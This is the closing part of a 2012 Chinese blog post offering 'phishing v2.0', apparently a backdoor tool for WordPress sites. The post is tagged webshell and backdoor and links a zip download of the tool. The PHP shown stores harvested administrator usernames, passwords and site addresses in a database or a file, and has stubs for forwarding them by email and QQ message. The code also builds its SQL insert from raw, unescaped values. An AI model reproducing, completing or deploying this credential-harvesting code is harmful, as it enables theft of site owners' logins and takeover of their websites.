@mysql_query(<span class="variable">$sql</span>,<span class="variable">$con</span>);</div><div class="line"> <span class="variable">$num_rows</span> = @mysql_num_rows(<span class="variable">$result</span>);</div><div class="line"></div><div class="line"> <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$num_rows</span>)){ <span class="comment">//过滤重复数据，插入库中没有的数据</span></div><div class="line"> <span class="variable">$sql</span> = &quot;INSERT INTO adminlist(adminlist.`name`,adminlist.`password`,adminlist.`site`) VALUES (<span class="string">'$name'</span>,<span class="string">'$pword'</span>,<span class="string">'$site'</span>)&quot;;</div><div class="line"> <span class="variable">$result</span> = @mysql_query(<span class="variable">$sql</span>,<span class="variable">$con</span>);</div><div class="line"> <span class="variable">$num_rows</span> = @mysql_num_rows(<span class="variable">$result</span>);</div><div class="line"> <span class="keyword">echo</span> <span class="variable">$num_rows</span>;</div><div class="line"> }<span class="keyword">else</span>{</div><div class="line"> <span class="keyword">echo</span> <span class="string">'库中已有！'</span>;</div><div class="line"> }</div><div class="line"> @mysql_free_result(<span class="variable">$result</span>);</div><div class="line">}</div><div class="line"><span class="comment">/**</span></div><div class="line"> * 保存到邮箱中，也就是发送数据到指定邮箱</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">saveToEmail</span><span class="params">()</span></span>{</div><div class="line"></div><div class="line">}</div><div class="line"><span class="comment">/**</span></div><div class="line"> * 邮件通知</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">mailTipMessage</span><span class="params">()</span></span>{</div><div class="line"></div><div class="line">}</div><div class="line"><span class="comment">/**</span></div><div class="line"> * QQ消息提醒</div><div class="line"> * 通过wap协议QQ发送消息</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">qqTipMessage</span><span class="params">()</span></span>{</div><div class="line"></div><div class="line">}</div><div class="line"><span class="comment">/**</span></div><div class="line"> * 第三方存储接口</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">otherApi</span><span class="params">()</span></span>{</div><div class="line"></div><div class="line">}</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> * 存储数据</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">saveData</span><span class="params">()</span></span>{</div><div class="line"> <span class="keyword">global</span> <span class="variable">$saveWay</span>;</div><div class="line"> <span class="keyword">switch</span> (<span class="variable">$saveWay</span>) {</div><div class="line"> <span class="keyword">case</span> <span class="string">'file'</span>:</div><div class="line"> saveToText(); <span class="comment">//保存到文件中</span></div><div class="line"> <span class="keyword">break</span>;</div><div class="line"> <span class="keyword">case</span> <span class="string">'mysql'</span>:</div><div class="line"> saveToDBserver();</div><div class="line"> <span class="keyword">break</span>;</div><div class="line"></div><div class="line"> }</div><div class="line"></div><div class="line">}</div><div class="line">saveData();</div></pre></td></tr></table></figure>

<p>下载地址:<a href="http://asset.creturn.com/asset/uploads/2012/07/钓鱼v2.0.zip" target="_blank" rel="external">钓鱼v2.0</a></p>

	 
	     <p style="margin:20px 0; color:#9f9f9f; font-size:12px;">
<span>Posted by <a style="color:#9f9f9f;" href="http://weibo.com/creturn"><strong>creturn</strong></a> - 7月 4 2012</span><br />
<span style="line-height:13px;">如需转载，请注明： 本文来自 <a style="color:#9f9f9f;" href="http://creturn.com"><strong>Return&#39;s Blog </strong></a></span>
</p>
       	 
      
    </div>
    <footer>
      
	 
     		  
  
  <div class="categories">
    <a href="/categories/原创作品/">原创作品</a>, <a href="/categories/原创作品/技术文章/">技术文章</a>
  </div>

       		
  
  <div class="tags">
    <a href="/tags/webshell/">webshell</a>, <a href="/tags/wordpress漏洞/">wordpress漏洞</a>, <a href="/tags/后门/">后门</a>
  </div>

     		  
       	 
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>


</div>
    </div>
    <div class="tabbar" onload="divideTabBar()">
	
      <div class="tabbaritem"><a class="next" href="/">Home</a></div>
    
      <div class="tabbaritem"><a class="next" href="/archives/">Archives</a></div>
    
      <div class="tabbaritem"><a class="next" href="/about/">About</a></div>
    
</div>


  </div>
</body>
</html>